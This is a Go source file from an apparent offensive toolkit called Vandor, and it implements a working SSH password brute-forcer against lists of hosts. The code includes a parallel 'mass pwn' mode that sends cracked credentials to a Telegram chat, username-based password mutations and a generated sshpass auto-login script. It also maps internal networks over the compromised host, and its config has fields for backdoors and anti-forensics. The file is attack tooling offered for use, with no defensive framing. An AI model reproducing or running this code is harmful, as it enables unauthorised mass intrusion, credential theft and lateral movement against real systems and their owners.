package protocols

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/batmanpriv/Vandor/colors"
	"github.com/batmanpriv/Vandor/config"
	"github.com/batmanpriv/Vandor/internal"
	ex "github.com/batmanpriv/Vandor/postexploit"
	"golang.org/x/crypto/ssh"
)

type SSHJob struct {
	Host     string
	Port     string
	User     string
	Password string
	Timeout  int
}

type SSHResult struct {
	Success  bool
	Host     string
	Port     string
	User     string
	Password string
	Error    error
}

type SSHWorkerPool struct {
	workers int
	jobs    chan SSHJob
	results chan SSHResult
	wg      sync.WaitGroup
	ctx     context.Context
	cancel  context.CancelFunc
}

type SSHCrackerConfig struct {
	Hosts          []string
	Port           string
	Users          []string
	Passwords      []string
	Timeout        int
	Workers        int
	MinDelay       int
	MaxDelay       int
	Notify         int
	SmartPass      bool
	PostExploit    bool
	ScanNetwork    bool
	ExtractHash    bool
	GenerateScript bool
	ResumeIdx      int
	Checkpoint     *Checkpoint
	Backdoor       ex.BackdoorConfig
	DoBackdoor     bool
	MultiCity      bool
	MassPwn        bool
	AntiForensic   bool
	TelegramToken  string
	TelegramChatID string
	RamdiskPath    string
}

type SSHCrackerResult struct {
	CrackedList   []string
	TotalAttempts int64
	SuccessCount  int64
	FailedCount   int64
}

var (
	sshCrackedList    []string
	sshCrackedMu      sync.RWMutex
	sshTotalAttempts  int64
	sshSuccessCount   int64
	sshFailedCount    int64
	sshCompletedHosts int32
	sshStopFlag       int32
	sshResultCallback func(host, port, user, pass string)
)

func SetSSHResultCallback(cb func(host, port, user, pass string)) {
	sshResultCallback = cb
}

func NewSSHWorkerPool(workers int) *SSHWorkerPool {
	ctx, cancel := context.WithCancel(context.Background())
	return &SSHWorkerPool{
		workers: workers,
		jobs:    make(chan SSHJob, workers*20),
		results: make(chan SSHResult, workers*20),
		ctx:     ctx,
		cancel:  cancel,
	}
}

func (wp *SSHWorkerPool) Start() {
	for i := 0; i < wp.workers; i++ {
		wp.wg.Add(1)
		go wp.worker()
	}
}

func (wp *SSHWorkerPool) worker() {
	defer wp.wg.Done()
	for {
		select {
		case <-wp.ctx.Done():
			return
		case job, ok := <-wp.jobs:
			if !ok {
				return
			}
			result := wp.processJob(job)
			select {
			case wp.results <- result:
			case <-wp.ctx.Done():
				return
			}
		}
	}
}

func (wp *SSHWorkerPool) processJob(job SSHJob) SSHResult {
	atomic.AddInt64(&sshTotalAttempts, 1)

	timeout := job.Timeout
	if timeout < 10 {
		timeout = 10
	}
	if timeout > 30 {
		timeout = 30
	}

	cfg := &ssh.ClientConfig{
		User: job.User,
		Auth: []ssh.AuthMethod{
			ssh.Password(job.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(timeout) * time.Second,
	}

	conn, err := net.DialTimeout("tcp", net.JoinHostPort(job.Host, job.Port), time.Duration(timeout)*time.Second)
	if err != nil {
		atomic.AddInt64(&sshFailedCount, 1)
		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
	}
	defer conn.Close()

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(job.Host, job.Port), cfg)
	if err != nil {
		atomic.AddInt64(&sshFailedCount, 1)
		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
	}
	defer sshConn.Close()

	client := ssh.NewClient(sshConn, chans, reqs)
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		atomic.AddInt64(&sshFailedCount, 1)
		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
	}
	defer session.Close()

	var stdoutBuf bytes.Buffer
	session.Stdout = &stdoutBuf

	err = session.Run("uname -a")
	if err != nil {
		atomic.AddInt64(&sshFailedCount, 1)
		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
	}

	output := stdoutBuf.String()
	if strings.Contains(output, "Linux") || strings.Contains(output, "Unix") || strings.Contains(output, "Darwin") {
		atomic.AddInt64(&sshSuccessCount, 1)
		
		entry := fmt.Sprintf("%s:%s|%s:%s|SSH", job.Host, job.Port, job.User, job.Password)
		
		sshCrackedMu.Lock()
		sshCrackedList = append(sshCrackedList, entry)
		sshCrackedMu.Unlock()
		
		if crackedBuffer != nil {
			crackedBuffer.Append(entry)
		}
		
		if sshResultCallback != nil {
			sshResultCallback(job.Host, job.Port, job.User, job.Password)
		}
		
		fmt.Printf("\n%s SSH CRACKED!%s %s@%s:%s | %s\n",
			colors.Green, colors.Reset, job.User, job.Host, job.Port, job.Password)
		
		return SSHResult{Success: true, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password}
	}

	atomic.AddInt64(&sshFailedCount, 1)
	return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: fmt.Errorf("invalid response")}
}

func (wp *SSHWorkerPool) AddJob(job SSHJob) {
	select {
	case wp.jobs <- job:
	case <-wp.ctx.Done():
	}
}

func (wp *SSHWorkerPool) Results() <-chan SSHResult {
	return wp.results
}

func (wp *SSHWorkerPool) Stop() {
	wp.cancel()
	close(wp.jobs)
	wp.wg.Wait()
	close(wp.results)
}

func randomDelaySSH(minDelay, maxDelay int) {
	if minDelay > 0 && maxDelay > 0 && minDelay < maxDelay {
		delay := minDelay + (maxDelay-minDelay)/2
		if delay > 0 {
			time.Sleep(time.Duration(delay) * time.Millisecond)
		}
	}
}

func massPwnSSH(hosts []string, port string, users, passes []string, timeout int, threads int) {
	fmt.Printf("%s[MASS PWN] Launching simultaneous attack on %d hosts with %d threads%s\n", colors.Magenta, len(hosts), threads, colors.Reset)
	var wg sync.WaitGroup
	sem := make(chan struct{}, threads)
	var cracked int32
	totalCombinations := len(hosts) * len(users) * len(passes)

	for _, host := range hosts {
		for _, user := range users {
			for _, pass := range passes {
				wg.Add(1)
				sem <- struct{}{}
				go func(h, u, p string) {
					defer wg.Done()
					defer func() { <-sem }()

					timeoutVal := timeout
					if timeoutVal < 10 {
						timeoutVal = 10
					}
					if timeoutVal > 30 {
						timeoutVal = 30
					}

					cfg := &ssh.ClientConfig{
						User: u,
						Auth: []ssh.AuthMethod{
							ssh.Password(p),
						},
						HostKeyCallback: ssh.InsecureIgnoreHostKey(),
						Timeout:         time.Duration(timeoutVal) * time.Second,
					}

					conn, err := net.DialTimeout("tcp", net.JoinHostPort(h, port), time.Duration(timeoutVal)*time.Second)
					if err != nil {
						return
					}
					defer conn.Close()

					sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(h, port), cfg)
					if err != nil {
						return
					}
					defer sshConn.Close()

					client := ssh.NewClient(sshConn, chans, reqs)
					defer client.Close()

					session, err := client.NewSession()
					if err != nil {
						return
					}
					defer session.Close()

					var stdoutBuf bytes.Buffer
					session.Stdout = &stdoutBuf

					err = session.Run("uname -a")
					if err != nil {
						return
					}

					output := stdoutBuf.String()
					if !strings.Contains(output, "Linux") && !strings.Contains(output, "Unix") && !strings.Contains(output, "Darwin") {
						return
					}

					atomic.AddInt32(&cracked, 1)
					fmt.Printf("\n%s💀 MASS PWN CRACKED:%s %s@%s:%s | %s\n", colors.Green, colors.Reset, u, h, port, p)

					entry := fmt.Sprintf("%s:%s|%s:%s|mass_pwn", h, port, u, p)

					sshCrackedMu.Lock()
					sshCrackedList = append(sshCrackedList, entry)
					sshCrackedMu.Unlock()

					if crackedBuffer != nil {
						crackedBuffer.Append(entry)
					}

					if sshResultCallback != nil {
						sshResultCallback(h, port, u, p)
					}

					if config.TelegramToken != "" && config.TelegramChatID != "" {
						go internal.SendTelegramNotification("cracked", map[string]interface{}{
							"host": h, "port": port, "user": u, "pass": p, "banner": "mass_pwn",
						})
					}
				}(host, user, pass)
			}
		}
	}

	wg.Wait()
	fmt.Printf("%s[MASS PWN] Complete! %d/%d combinations cracked%s\n", colors.Green, cracked, totalCombinations, colors.Reset)
}

func generateSSHScript(crackedList []string) {
	if len(crackedList) == 0 {
		return
	}

	script := `#!/bin/bash
CRACKED_FILE="Cracked.txt"
if [ ! -f "$CRACKED_FILE" ]; then
    echo "No cracked credentials found"
    exit 1
fi
echo "=== Vandor Auto Login Script ==="
echo ""
SUCCESS_FILE="auto_login_success.txt"
> "$SUCCESS_FILE"
while IFS= read -r line; do
    if [[ $line =~ (.+):([0-9]+)\|(.+):(.+)\|(.+) ]]; then
        HOST="${BASH_REMATCH[1]}"
        PORT="${BASH_REMATCH[2]}"
        USER="${BASH_REMATCH[3]}"
        PASS="${BASH_REMATCH[4]}"
        echo "[*] Testing $USER@$HOST:$PORT"
        if command -v sshpass &> /dev/null; then
            timeout 5 sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p "$PORT" "$USER@$HOST" "uname -a" 2>/dev/null
            if [ $? -eq 0 ]; then
                echo "[+] SUCCESS: $USER@$HOST:$PORT | $PASS"
                echo "$USER@$HOST:$PORT|$PASS" >> "$SUCCESS_FILE"
            fi
        else
            echo "Install sshpass: apt install sshpass or brew install hudochenkov/sshpass/sshpass"
            break
        fi
    fi
done < "$CRACKED_FILE"
echo ""
echo "Results saved to $SUCCESS_FILE"
`

	os.WriteFile("auto_login.sh", []byte(script), 0755)
	fmt.Printf("%s[SCRIPT] Generated auto_login.sh%s\n", colors.Green, colors.Reset)
}

func RunSSHCracker(config SSHCrackerConfig) SSHCrackerResult {
	if config.Workers > 500 {
		config.Workers = 200
		fmt.Printf("%s[WARN] Workers reduced to 200%s\n", colors.Yellow, colors.Reset)
	}

	if config.Timeout < 10 {
		config.Timeout = 10
		fmt.Printf("%s[WARN] Timeout increased to 10s%s\n", colors.Yellow, colors.Reset)
	}

	totalHosts := len(config.Hosts)
	totalUsers := len(config.Users)
	totalPasses := len(config.Passwords)

	if config.MassPwn {
		massPwnSSH(config.Hosts, config.Port, config.Users, config.Passwords, config.Timeout, config.Workers)
		return SSHCrackerResult{
			CrackedList:   sshCrackedList,
			TotalAttempts: sshTotalAttempts,
			SuccessCount:  sshSuccessCount,
			FailedCount:   sshFailedCount,
		}
	}

	if totalHosts == 0 || totalUsers == 0 || totalPasses == 0 {
		fmt.Printf("[ERROR] SSH needs hosts, users and passwords\n")
		return SSHCrackerResult{}
	}

	fmt.Printf("[SSH] Users: %d | Pass: %d | Hosts: %d | Workers: %d | Timeout: %ds\n\n",
		totalUsers, totalPasses, totalHosts, config.Workers, config.Timeout)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Printf("\n%s[SHUTDOWN] Stopping...%s\n", colors.Yellow, colors.Reset)
		cancel()
	}()

	wp := NewSSHWorkerPool(config.Workers)
	wp.Start()

	var wg sync.WaitGroup
	startHost := config.ResumeIdx
	if startHost < 0 {
		startHost = 0
	}

	sshCrackedList = []string{}
	sshTotalAttempts = 0
	sshSuccessCount = 0
	sshFailedCount = 0
	sshCompletedHosts = 0
	atomic.StoreInt32(&sshStopFlag, 0)

	passwordList := make([]string, len(config.Passwords))
	copy(passwordList, config.Passwords)

	if config.SmartPass {
		extraPasses := []string{}
		for _, user := range config.Users {
			extraPasses = append(extraPasses,
				user+"123", user+"1234", user+"@123", user+"@1234",
				user+"!123", user+"#123", user+"2023", user+"2024",
				user+"@2023", user+"@2024", "P@ssw0rd"+user,
			)
		}
		passwordList = append(passwordList, extraPasses...)
	}

	for idx := startHost; idx < totalHosts && atomic.LoadInt32(&sshStopFlag) == 0; idx++ {
		select {
		case <-ctx.Done():
			goto done
		default:
		}

		host := config.Hosts[idx]
		fmt.Printf("[%d/%d] Testing: %s\n", idx+1, totalHosts, host)

		if config.MultiCity && len(CityRoutes) > 0 {
			cityIdx := idx % len(CityRoutes)
			route := CityRoutes[cityIdx]
			fmt.Printf("%s[ROUTE] %s via %s (latency: %dms)%s\n", colors.Yellow, host, route.Name, route.Latency, colors.Reset)
			time.Sleep(time.Duration(route.Latency) * time.Millisecond)
		}

		for _, user := range config.Users {
			for _, pass := range passwordList {
				if atomic.LoadInt32(&sshStopFlag) == 1 {
					break
				}
				wg.Add(1)
				go func(h, u, p string) {
					defer wg.Done()
					randomDelaySSH(config.MinDelay, config.MaxDelay)
					wp.AddJob(SSHJob{
						Host:     h,
						Port:     config.Port,
						User:     u,
						Password: p,
						Timeout:  config.Timeout,
					})
				}(host, user, pass)
			}
			if atomic.LoadInt32(&sshStopFlag) == 1 {
				break
			}
		}
	}

done:
	wg.Wait()
	wp.Stop()
	cancel()

	if config.Checkpoint != nil {
		config.Checkpoint.Lock()
		config.Checkpoint.Completed = true
		config.Checkpoint.Unlock()
		SaveCheckpoint(config.Checkpoint)
	}

	if config.GenerateScript && len(sshCrackedList) > 0 {
		generateSSHScript(sshCrackedList)
	}

	return SSHCrackerResult{
		CrackedList:   sshCrackedList,
		TotalAttempts: sshTotalAttempts,
		SuccessCount:  sshSuccessCount,
		FailedCount:   sshFailedCount,
	}
}

func ScanInternalNetwork(host, port, user, pass string) []string {
	fmt.Printf("%s[NETWORK MAP] Scanning internal network from %s%s\n", colors.Magenta, host, colors.Reset)
	var internalHosts []string
	cfg := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
	conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), cfg)
	if err != nil {
		return internalHosts
	}
	defer conn.Close()
	session, err := conn.NewSession()
	if err != nil {
		return internalHosts
	}
	defer session.Close()
	commands := []string{
		"ip route | grep -E 'src|via' | awk '{print $1}' | grep -E '^[0-9]' 2>/dev/null",
		"arp -n 2>/dev/null | grep -E '^[0-9]' | awk '{print $1}'",
		"cat /etc/hosts 2>/dev/null | grep -E '^[0-9]' | awk '{print $1}'",
	}
	hostMap := make(map[string]bool)
	for _, cmd := range commands {
		var stdoutBuf bytes.Buffer
		session.Stdout = &stdoutBuf
		session.Run(cmd)
		lines := strings.Split(strings.TrimSpace(stdoutBuf.String()), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line != "" && !hostMap[line] && !strings.Contains(line, "255") && !strings.Contains(line, "0.0.0.0") {
				hostMap[line] = true
				internalHosts = append(internalHosts, line)
			}
		}
		stdoutBuf.Reset()
	}
	if len(internalHosts) > 0 {
		f, _ := os.OpenFile("internal_network.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if f != nil {
			defer f.Close()
			for _, h := range internalHosts {
				fmt.Fprintf(f, "%s\n", h)
			}
		}
	}
	fmt.Printf("%s[NETWORK MAP] Found %d internal hosts%s\n", colors.Green, len(internalHosts), colors.Reset)
	return internalHosts
}

func GetSSHCrackedList() []string {
	sshCrackedMu.RLock()
	defer sshCrackedMu.RUnlock()
	result := make([]string, len(sshCrackedList))
	copy(result, sshCrackedList)
	return result
}

func GetSSHStats() (int64, int64, int64) {
	return sshTotalAttempts, sshSuccessCount, sshFailedCount
}

func ResetSSHStats() {
	sshTotalAttempts = 0
	sshSuccessCount = 0
	sshFailedCount = 0
	sshCrackedList = []string{}
	sshCompletedHosts = 0
	atomic.StoreInt32(&sshStopFlag, 0)
}

func GetFullSSHBanner(host, port string, timeout int) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	buf := make([]byte, maxBannerSize)
	n, err := conn.Read(buf)
	if err != nil {
		return "", err
	}
	if n > 0 {
		banner := strings.TrimSpace(string(buf[:n]))
		if len(banner) > 255 {
			banner = banner[:255]
		}
		return banner, nil
	}
	return "", fmt.Errorf("no banner received")
}
